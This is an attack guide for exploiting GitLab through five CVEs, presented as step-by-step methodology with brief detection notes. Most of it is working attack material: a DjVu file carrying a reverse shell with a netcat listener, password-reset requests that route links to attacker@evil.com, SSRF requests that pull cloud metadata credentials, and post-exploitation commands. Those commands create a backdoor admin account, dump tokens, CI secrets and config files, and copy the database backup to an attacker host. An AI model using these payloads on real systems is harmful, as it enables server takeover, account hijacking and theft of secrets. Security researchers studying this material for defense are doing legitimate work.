# Comprehensive GitLab Exploitation Methodologies



## Table of Contents

1.  [CVE-2021-22205: Unauthenticated Remote Code Execution (RCE)](#cve-2021-22205-unauthenticated-remote-code-execution-rce)
2.  [CVE-2023-7028: Account Takeover via Password Reset Poisoning](#cve-2023-7028-account-takeover-via-password-reset-poisoning)
3.  [CVE-2021-4191: User Enumeration via GraphQL API](#cve-2021-4191-user-enumeration-via-graphql-api)
4.  [CVE-2021-22214: Server-Side Request Forgery (SSRF) via CI Lint API](#cve-2021-22214-server-side-request-forgery-ssrf-via-ci-lint-api)
5.  [CVE-2024-8641: CI_JOB_TOKEN Session Theft](#cve-2024-8641-ci_job_token-session-theft)
6.  [Post-Exploitation Techniques](#post-exploitation-techniques)
7.  [Testing and Automation Tools](#testing-and-automation-tools)


## CVE-2021-22205: Unauthenticated Remote Code Execution (RCE)

### Vulnerability Overview

This critical vulnerability allows an unauthenticated attacker to execute arbitrary commands on the GitLab server. The flaw exists in GitLab's use of ExifTool to process uploaded DjVu image files. ExifTool itself had a vulnerability (CVE-2021-22204) that allowed command injection through specially crafted DjVu files .

**Affected Versions:** GitLab Community Edition (CE) and Enterprise Edition (EE) before 13.10.3, 13.9.6, and 13.8.8 

**CVSS Score:** Critical (10.0)

**Why This Matters:** This vulnerability requires no authentication. Any attacker who can reach the GitLab instance can gain complete control over the server.

### Step-by-Step Exploitation Methodology

#### Step 1: Reconnaissance and Version Detection

Before attempting exploitation, verify the target is running a vulnerable version.

```bash
# Check the GitLab version via the API
curl https://gitlab.target.com/api/v4/version

# Check via the help page
curl https://gitlab.target.com/help | grep -i "gitlab version"

# Examine HTTP headers for version information
curl -I https://gitlab.target.com
```

If the version is below the patched releases, the target is vulnerable.

#### Step 2: Generate the Malicious Payload

The exploit requires creating a DjVu file that contains a reverse shell payload. When ExifTool processes this file, it executes the embedded command .

```bash
# Step 2a: Create the base DjVu file from a base64 string
echo -e "QVQmVEZPUk0AAAOvREpWTURJUk0AAAAugQACAAAARgAAAKz//96/mSAhyJFO6wwHH9LaiOhr5kQPLHEC7knTbpW9osMiP0ZPUk0AAABeREpWVUlORk8AAAAKAAgACBgAZAAWAElOQ0wAAAAPc2hhcmVkX2Fubm8uaWZmAEJHNDQAAAARAEoBAgAIAAiK5uGxN9l/KokAQkc0NAAAAAQBD/mfQkc0NAAAAAICCkZPUk0AAAMHREpWSUFOVGEAAAFQKG1ldGFkYXRhCgkoQ29weXJpZ2h0ICJcCiIgLiBxeHs=" | base64 -d > exploit.jpg

# Step 2b: Append the reverse shell command (change IP and port as needed)
echo -n 'TF=$(mktemp -u);mkfifo $TF && telnet 10.0.0.3 1270 0<$TF | sh 1>$TF' >> exploit.jpg

# Step 2c: Append the closing payload
echo -n "fSAuIFwKIiBiICIpICkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCg==" | base64 -d >> exploit.jpg
```

**What this payload does:**
- Creates a named pipe (FIFO)
- Connects back to attacker's machine on port 1270
- Pipes the connection directly to a shell
- Executes commands received from the attacker

#### Step 3: Set Up a Listener

Before sending the exploit, start a netcat listener to catch the reverse shell.

```bash
# Start listener on your attack machine
nc -lnvp 1270
```

**Expected output when ready:**
```
Listening on [0.0.0.0] (family 0, port 1270)
```

#### Step 4: Send the Malicious File

The payload can be sent to any random endpoint. GitLab will attempt to process any uploaded DjVu file .

```bash
# Send the exploit to a random endpoint
curl -v -F 'file=@exploit.jpg' https://gitlab.target.com/$(openssl rand -hex 8)
```

The `$(openssl rand -hex 8)` generates a random path to avoid detection by basic intrusion detection systems.

#### Step 5: Receive the Reverse Shell

If successful, the netcat listener will show a connection and provide shell access.

```bash
# Successful exploitation output
$ nc -lnvp 1270
Listening on [0.0.0.0] (family 0, port 1270)
Connection from [10.0.0.7] port 1270 [tcp/*] accepted (family 2, sport 34836)

# Commands can now be run on the target
whoami
git

id
uid=998(git) gid=998(git) groups=998(git)

# Check system information
uname -a
cat /etc/os-release
```

**Important Note:** The shell runs as the `git` user, which has limited privileges but can access Git repositories and configuration files.

### Using Metasploit for CVE-2021-22205

For automated exploitation, Metasploit provides a module.

```bash
# Start Metasploit
msfconsole

# Use the GitLab RCE module
use exploit/linux/http/gitlab_exifthumb_rce

# Set required options
set RHOSTS gitlab.target.com
set LHOST your-ip-address
set LPORT 4444
set TARGETURI /

# Run the exploit
run
```

### Detection and Indicators of Compromise

**What to look for in logs:**
- Upload requests to random, non-existent endpoints
- POST requests with multipart form data containing DjVu files
- Unusual outbound network connections from the GitLab server

**Log locations on the GitLab server:**
```bash
/var/log/gitlab/gitlab-rails/production.log
/var/log/gitlab/nginx/gitlab_access.log
/var/log/gitlab/nginx/gitlab_error.log
```


## CVE-2023-7028: Account Takeover via Password Reset Poisoning

### Vulnerability Overview

This critical vulnerability allows an unauthenticated attacker to take over any GitLab account by abusing the password reset functionality. The flaw allows an attacker to request a password reset for a victim and have the reset link sent to both the victim's email and an attacker-controlled email address .

**Affected Versions:** GitLab 16.1 prior to 16.1.6, 16.2 prior to 16.2.9, 16.3 prior to 16.3.7, 16.4 prior to 16.4.5, 16.5 prior to 16.5.6, 16.6 prior to 16.6.4, and 16.7 prior to 16.7.2 

**CVSS Score:** 8.8 (High)

**Important Limitation:** Two-factor authentication (2FA) prevents exploitation. Accounts with 2FA enabled are not vulnerable .

### Step-by-Step Exploitation Methodology

#### Step 1: Identify a Target

You need two pieces of information:
- The victim's email address associated with their GitLab account
- An email address you control (attacker email)

```bash
# Common admin email patterns to try
admin@target.com
administrator@target.com
root@target.com
gitlab@target.com

# Regular user emails may be discovered through:
# - Public projects and commits
# - User profiles (if accessible)
# - Previous data breaches
```

#### Step 2: Send the Malicious Password Reset Request

The vulnerability exploits the fact that the password reset endpoint accepts duplicate `user[email]` parameters .

**Using cURL (Manual Method):**

```bash
# Send password reset request with two email addresses
curl -X POST https://gitlab.target.com/users/password \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "user[email][]=victim@target.com&user[email][]=attacker@evil.com"
```

**Using Burp Suite:**

1. Navigate to `https://gitlab.target.com/users/sign_in`
2. Click "Forgot your password?"
3. Intercept the password reset request with Burp Suite
4. Modify the request body:

**Original Request:**
```
POST /users/password HTTP/1.1
Host: gitlab.target.com
Content-Type: application/x-www-form-urlencoded

user[email]=victim@target.com&commit=Reset+password
```

**Modified Exploit Request:**
```
POST /users/password HTTP/1.1
Host: gitlab.target.com
Content-Type: application/x-www-form-urlencoded

user[email][]=victim@target.com&user[email][]=attacker@evil.com&commit=Reset+password
```

**Key Change:** The parameter `user[email]` becomes `user[email][]` with two values. This tricks GitLab into sending the reset token to both addresses.

#### Step 3: Receive the Password Reset Link

If successful, both the victim and attacker will receive an email titled "Reset password instructions" .

Check the attacker-controlled email inbox for the reset link. The link will look similar to:
```
https://gitlab.target.com/users/password/edit?reset_password_token=TOKEN_VALUE
```

#### Step 4: Reset the Password

1. Click the link in the attacker's email
2. Enter a new password for the account
3. Confirm the password
4. Submit the form

#### Step 5: Access the Compromised Account

Log in using the victim's email/username and the new password you set.

**For administrator accounts:** The default admin username is often `root` .

### Using Metasploit for Automated Exploitation

Metasploit provides a module for this vulnerability .

```bash
# Start Metasploit
msfconsole

# Use the auxiliary module
use auxiliary/admin/http/gitlab_password_reset_account_takeover

# Set required options
set RHOSTS gitlab.target.com
set TARGETEMAIL victim@target.com
set MYEMAIL attacker@evil.com
set TARGETURI /

# Run the module
run
```

**Expected Output:**
```
[*] Obtaining CSRF token
[+] Received CSRF Token: abc123def456...
[*] Sending password reset request
[+] Sent, check attacker@evil.com for a possible password reset link
```

### Using the Python Exploit Script

A Python exploit script is available for this vulnerability .

```bash
# Install required library
pip install requests

# Run the exploit
python3 exploit.py -u https://gitlab.target.com -t victim@target.com -e attacker@evil.com
```

### Detection and Indicators

**Log evidence:**
- Password reset requests with multiple email parameters
- Unusual patterns in `user[email][]` parameters

**Protection:**
- Enable 2FA on all accounts, especially administrative accounts
- Monitor for unexpected password reset emails


## CVE-2021-4191: User Enumeration via GraphQL API

### Vulnerability Overview

This information disclosure vulnerability allows unauthenticated attackers to enumerate valid usernames and email addresses from private GitLab instances. Even with restricted sign-ups enabled, the GraphQL API leaks user information .

**Affected Versions:** GitLab CE/EE versions 13.0 to 14.6.5, 14.7 to 14.7.4, and 14.8 to 14.8.2 

**CVSS Score:** 5.3 (Medium)

**Impact:** Attackers can build lists of valid users for further attacks, including password spraying or targeted phishing.

### Step-by-Step Exploitation Methodology

#### Step 1: Identify the GraphQL Endpoint

The GraphQL API is typically available at:
```
https://gitlab.target.com/api/graphql
```

#### Step 2: Craft the Enumeration Query

The vulnerable GraphQL query requests user information without authentication .

```bash
# Simple user enumeration query
curl -X POST https://gitlab.target.com/api/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query { users { nodes { id name username email } } }"}'
```

**More comprehensive enumeration:**
```bash
# Paginated enumeration to get all users
curl -X POST https://gitlab.target.com/api/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query { users(first: 100) { nodes { id username email name } pageInfo { hasNextPage endCursor } } }"}'
```

#### Step 3: Parse the Results

If the instance is vulnerable, the response will contain user information.

**Sample vulnerable response:**
```json
{
  "data": {
    "users": {
      "nodes": [
        {
          "id": "gid://gitlab/User/1",
          "username": "root",
          "email": "admin@gitlab.target.com",
          "name": "Administrator"
        },
        {
          "id": "gid://gitlab/User/2",
          "username": "john.doe",
          "email": "john@target.com",
          "name": "John Doe"
        }
      ]
    }
  }
}
```

#### Step 4: Automated Enumeration Script

```python
#!/usr/bin/env python3
import requests
import json
import sys

def enumerate_users(target_url):
    """Enumerate GitLab users via GraphQL API"""
    graphql_url = f"{target_url}/api/graphql"
    
    query = """
    query {
        users(first: 100) {
            nodes {
                id
                username
                email
                name
            }
            pageInfo {
                hasNextPage
                endCursor
            }
        }
    }
    """
    
    headers = {"Content-Type": "application/json"}
    payload = {"query": query}
    
    try:
        response = requests.post(graphql_url, json=payload, headers=headers, verify=False)
        
        if response.status_code == 200:
            data = response.json()
            if "data" in data and "users" in data["data"]:
                users = data["data"]["users"]["nodes"]
                for user in users:
                    print(f"Username: {user['username']}, Email: {user['email']}, Name: {user['name']}")
            else:
                print("No user data returned - instance may be patched")
        else:
            print(f"Request failed with status {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <gitlab_url>")
        sys.exit(1)
    enumerate_users(sys.argv[1])
```

### Using Metasploit for Enumeration

```bash
msfconsole
use auxiliary/gather/gitlab_graphql_user_enumeration
set RHOSTS gitlab.target.com
set TARGETURI /
run
```

### Detection

**What to look for:**
- Multiple GraphQL API requests from the same IP
- Requests to `/api/graphql` without authentication headers
- Unusual query patterns requesting user data


## CVE-2021-22214: Server-Side Request Forgery (SSRF) via CI Lint API

### Vulnerability Overview

This SSRF vulnerability allows an unauthenticated attacker to make the GitLab server send requests to internal systems. The CI Lint API validates CI/CD YAML configurations and the `include:remote` feature fetches remote YAML files without proper validation .

**Affected Versions:** GitLab versions from 10.5 up to 13.12.2, 13.11.5, and 13.10.5 

**CVSS Score:** 8.6 (High)

**Impact:** Attackers can scan internal networks, access cloud metadata endpoints (AWS, GCP, Azure), and potentially exploit internal services.

### Step-by-Step Exploitation Methodology

#### Step 1: Craft the Malicious YAML Payload

The CI Lint API accepts a `content` parameter with a YAML configuration that includes a remote file .

```json
{
  "content": "include:\n  remote: http://169.254.169.254/latest/meta-data/\n"
}
```

#### Step 2: Send the SSRF Request

```bash
curl -X POST "https://gitlab.target.com/api/v4/ci/lint" \
  -H "Content-Type: application/json" \
  -d '{"content": "include:\n  remote: http://169.254.169.254/latest/meta-data/\n"}'
```

**If vulnerable, GitLab will attempt to fetch from the specified URL.**

#### Step 3: Test for Blind SSRF with a Collaborator

```bash
# Use a Burp Collaborator or Interactsh URL
curl -X POST "https://gitlab.target.com/api/v4/ci/lint" \
  -H "Content-Type: application/json" \
  -d '{"content": "include:\n  remote: http://your-collaborator-url.com/test.yml\n"}'
```

Check the collaborator service for incoming requests from the GitLab server's IP address.

#### Step 4: Access Cloud Metadata

**AWS Metadata:**
```bash
curl -X POST "https://gitlab.target.com/api/v4/ci/lint" \
  -H "Content-Type: application/json" \
  -d '{"content": "include:\n  remote: http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"}'
```

**GCP Metadata:**
```bash
curl -X POST "https://gitlab.target.com/api/v4/ci/lint" \
  -H "Content-Type: application/json" \
  -d '{"content": "include:\n  remote: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\n  headers:\n    Metadata-Flavor: Google\n"}'
```

#### Step 5: Internal Network Scanning

```bash
# Scan for internal services
for port in 22 80 443 3306 5432 6379 9200; do
  curl -X POST "https://gitlab.target.com/api/v4/ci/lint" \
    -H "Content-Type: application/json" \
    -d "{\"content\": \"include:\n  remote: http://10.0.0.1:$port/\n\"}"
done
```

### Using Docker for Testing

A vulnerable Docker environment is available for testing .

```bash
# Pull and run the vulnerable GitLab instance
docker pull vulfocus/gitlab-cve_2021_22214:latest
docker run -d -P vulfocus/gitlab-cve_2021_22214

# Find the exposed port
docker ps
```

### Detection

**Log indicators:**
- Requests to `/api/v4/ci/lint` with `include:remote` pointing to unexpected IP addresses
- Outbound connections from GitLab to internal IP ranges or cloud metadata endpoints


## CVE-2024-8641: CI_JOB_TOKEN Session Theft

### Vulnerability Overview

This privilege escalation vulnerability allows an attacker who has obtained a victim's CI_JOB_TOKEN to convert it into a full GitLab session token. This effectively bypasses the intended scope limitations of CI_JOB_TOKEN .

**Affected Versions:** GitLab CE/EE versions from 13.7 prior to 17.1.7, from 17.2 prior to 17.2.5, and from 17.3 prior to 17.3.2 

**CVSS Score:** 8.8 (High)

**Impact:** An attacker with a stolen CI_JOB_TOKEN can impersonate the victim user with full web session privileges.

### Exploitation Scenario

**Prerequisites:**
- Attacker has obtained a victim's CI_JOB_TOKEN (through log leakage, misconfigured variables, or other means)
- The GitLab instance is running a vulnerable version

### Step-by-Step Exploitation

#### Step 1: Obtain a CI_JOB_TOKEN

Common ways CI_JOB_TOKEN leaks:
- Exposed in CI job logs
- Printed by misconfigured `echo $CI_JOB_TOKEN` commands
- Stored in accessible artifacts
- Leaked through debugging output

```bash
# Example of exposed token in logs
$ echo $CI_JOB_TOKEN
glpat-xyz123abc456def789
```

#### Step 2: Use the Token to Obtain a Session

The exact exploitation details are not publicly disclosed to allow for patching, but the vulnerability allows converting the CI_JOB_TOKEN into a user session token.

```bash
# Attempt to use the CI_JOB_TOKEN for API access
curl -H "Authorization: Bearer glpat-xyz123abc456def789" \
  https://gitlab.target.com/api/v4/user
```

If successful, the API returns the victim's user information, confirming the token's validity.

#### Step 3: Session Token Conversion

The vulnerability allows the CI_JOB_TOKEN to be used to generate or obtain a full web session cookie, which can then be used in a browser to access the GitLab web interface as the victim user.

### Prevention

**For defenders:**
- Upgrade to patched versions immediately
- Never expose CI_JOB_TOKEN in logs or artifacts
- Use CI_JOB_TOKEN with minimal required permissions
- Implement secret scanning in CI/CD pipelines


## Post-Exploitation Techniques

Once initial access is achieved (whether through RCE or compromised credentials), the following techniques help escalate privileges and extract data.

### Accessing GitLab Rails Console

If you have shell access as the `git` user or root, the Rails console provides complete control over the GitLab instance.

```bash
# Access the Rails console
sudo gitlab-rails console

# Or as root
gitlab-rails console production
```

### Common Rails Console Commands

**Reset the root password:**
```ruby
# Find the root user
user = User.find_by(username: 'root')
# Or by ID
user = User.find(1)

# Set a new password
user.password = 'NewSecurePassword123!'
user.password_confirmation = 'NewSecurePassword123!'
user.save!

# Verify
puts user.valid_password?('NewSecurePassword123!')
```

**List all users and their roles:**
```ruby
User.all.each do |u|
  puts "#{u.id}: #{u.username} (#{u.email}) - Admin: #{u.admin?}"
end
```

**List all personal access tokens:**
```ruby
PersonalAccessToken.all.each do |token|
  puts "User: #{token.user.username}, Token: #{token.token}, Scope: #{token.scopes}"
end
```

**Create a new admin user:**
```ruby
user = User.new(
  username: 'attacker',
  email: 'attacker@evil.com',
  name: 'Attacker',
  password: 'Password123!',
  password_confirmation: 'Password123!'
)
user.admin = true
user.skip_confirmation!
user.save!
```

**Extract all repository URLs:**
```ruby
Project.all.each do |project|
  puts "Project: #{project.name}, SSH: #{project.ssh_url_to_repo}, HTTP: #{project.http_url_to_repo}"
end
```

**Dump all CI/CD variables:**
```ruby
Ci::Variable.all.each do |var|
  puts "Project: #{var.project_id}, Key: #{var.key}, Value: #{var.value}"
end
```

GroupVariable.all.each do |var|
  puts "Group: #{var.group_id}, Key: #{var.key}, Value: #{var.value}"
end
```

### Extracting Secrets from Configuration

```bash
# Database credentials
cat /etc/gitlab/gitlab.rb | grep -i "password\|secret\|key"

# GitLab secrets (cookie signing, CSRF, etc.)
cat /etc/gitlab/gitlab-secrets.json

# Database configuration
cat /var/opt/gitlab/gitlab-rails/etc/database.yml

# SMTP credentials (may contain passwords)
cat /etc/gitlab/gitlab.rb | grep -A5 "smtp"
```

### Dumping the Database

```bash
# Create a database dump
sudo gitlab-rake gitlab:backup:create

# The backup will be in /var/opt/gitlab/backups/
ls -la /var/opt/gitlab/backups/

# Copy the backup file
scp /var/opt/gitlab/backups/backup_file.tar attacker@host:/path/
```


## Testing and Automation Tools

### Manual Testing with Burp Suite

**Setting up Burp Suite for GitLab testing:**

1. **Configure Burp as a proxy** between your browser and the GitLab instance
2. **Enable logging** of all requests and responses
3. **Use the Repeater** tool to modify and replay requests

**Testing for CVE-2023-7028 with Burp:**
```
1. Navigate to /users/sign_in
2. Click "Forgot password"
3. Capture the POST request to /users/password
4. Send to Repeater
5. Modify body to: user[email][]=victim@target.com&user[email][]=attacker@evil.com
6. Send and observe response
```

**Testing for CVE-2021-22205 with Burp:**
```
1. Capture any file upload request
2. Replace the uploaded file with the malicious DjVu payload
3. Send to Repeater
4. Observe response and check listener
```

### Automated Tools

**Nuclei Template Scanning:**
```bash
# Run all GitLab-related templates
nuclei -t http/cves/2021/CVE-2021-22205.yaml -u https://gitlab.target.com
nuclei -t http/cves/2021/CVE-2021-4191.yaml -u https://gitlab.target.com
nuclei -t http/cves/2023/CVE-2023-7028.yaml -u https://gitlab.target.com

# Run all GitLab templates
nuclei -tags gitlab -u https://gitlab.target.com
```

**Metasploit Framework:**
```bash
# Search for GitLab modules
msfconsole
search gitlab

# Common modules
use exploit/linux/http/gitlab_exifthumb_rce        # CVE-2021-22205
use auxiliary/admin/http/gitlab_password_reset_account_takeover  # CVE-2023-7028
use auxiliary/gather/gitlab_graphql_user_enumeration  # CVE-2021-4191
```

**Custom Python Exploit Framework:**
```python
#!/usr/bin/env python3
import requests
import sys
import json

class GitLabExploitFramework:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
    
    def check_version(self):
        """Retrieve GitLab version"""
        try:
            r = self.session.get(f"{self.target}/api/v4/version")
            if r.status_code == 200:
                return r.json().get('version')
        except:
            pass
        return None
    
    def test_cve_2021_22205(self):
        """Test for RCE vulnerability"""
        # Implementation
        pass
    
    def test_cve_2023_7028(self, victim_email, attacker_email):
        """Test for account takeover"""
        data = {
            'user[email][]': [victim_email, attacker_email]
        }
        r = self.session.post(f"{self.target}/users/password", data=data)
        return r.status_code == 302
    
    def enumerate_users_graphql(self):
        """Enumerate users via GraphQL"""
        query = {"query": "query { users { nodes { username email } } }"}
        r = self.session.post(f"{self.target}/api/graphql", json=query)
        if r.status_code == 200:
            return r.json().get('data', {}).get('users', {}).get('nodes', [])
        return []
    
    def test_ssrf_ci_lint(self, target_url):
        """Test for SSRF via CI Lint"""
        payload = {
            "content": f"include:\n  remote: {target_url}\n"
        }
        r = self.session.post(f"{self.target}/api/v4/ci/lint", json=payload)
        return r.status_code == 200

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <gitlab_url>")
        sys.exit(1)
    
    g = GitLabExploitFramework(sys.argv[1])
    version = g.check_version()
    print(f"Target version: {version}")
```

### Vulnerability Scanners

**Nessus/Tenable:**
- Plugin ID 113210 for CVE-2021-4191 detection 

**OpenVAS:**
- Contains checks for GitLab CVEs

**Shodan Dorking:**
```
# Find GitLab instances
title:"GitLab" "Server: nginx"

# Search by version
"GitLab" "13.10.2"
```

### Docker Testing Environments

Many GitLab vulnerabilities can be tested safely in Docker containers.

```bash
# CVE-2021-22214 vulnerable environment
docker pull vulfocus/gitlab-cve_2021_22214:latest
docker run -d -P vulfocus/gitlab-cve_2021_22214

# Generic GitLab vulnerable version
docker run -d -p 8080:80 gitlab/gitlab-ce:13.10.2-ce.0
```

### Log Analysis for Testing

When testing your own instances, check these log locations:

```bash
# GitLab Rails logs
/var/log/gitlab/gitlab-rails/production.log

# Nginx access logs
/var/log/gitlab/nginx/gitlab_access.log

# Nginx error logs
/var/log/gitlab/nginx/gitlab_error.log

# Sidekiq logs
/var/log/gitlab/sidekiq/current

# Auth logs for password reset attempts
/var/log/gitlab/gitlab-rails/auth.log
```


## Summary of Real-World Exploitation Examples

| Vulnerability | Real-World Impact | Exploitation Complexity |
|---------------|-------------------|------------------------|
| CVE-2021-22205 (RCE) | Attackers gained shell access to GitLab servers, stole source code, and deployed backdoors | Low - unauthenticated |
| CVE-2023-7028 (Account Takeover) | Multiple instances compromised, including administrative accounts | Low - unauthenticated |
| CVE-2021-4191 (User Enumeration) | Used in combination with password spraying attacks | Very Low - unauthenticated |
| CVE-2021-22214 (SSRF) | Cloud metadata theft and internal network reconnaissance | Low - unauthenticated |
| CVE-2024-8641 (Token Theft) | Privilege escalation from CI/CD to web session | Medium - requires stolen token |

## Defense Recommendations

1. **Keep GitLab updated** - Most vulnerabilities are patched in newer versions
2. **Enable 2FA** - Prevents account takeover even with password reset vulnerabilities
3. **Audit CI/CD variables** - Never store plaintext secrets
4. **Monitor logs** - Watch for unusual GraphQL queries or CI Lint API usage
5. **Network segmentation** - Limit GitLab's outbound access to prevent SSRF exploitation
6. **Use WAF rules** - Block known exploit patterns for unpatched instances
